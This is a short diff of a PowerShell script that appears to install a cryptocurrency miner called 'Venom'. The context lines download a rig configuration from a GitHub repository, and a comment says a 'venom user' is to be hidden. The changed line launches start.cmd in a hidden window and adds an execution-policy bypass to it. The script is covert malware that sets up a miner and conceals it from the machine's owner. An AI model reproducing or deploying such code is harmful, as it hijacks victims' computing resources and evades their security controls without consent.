@@ -76,7 +76,7 @@ Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master
 Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json -OutFile "config.json"
 
 # start rig
-powershell -windowstyle hidden ./start.cmd
+powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd
 
 
 # hide venom user
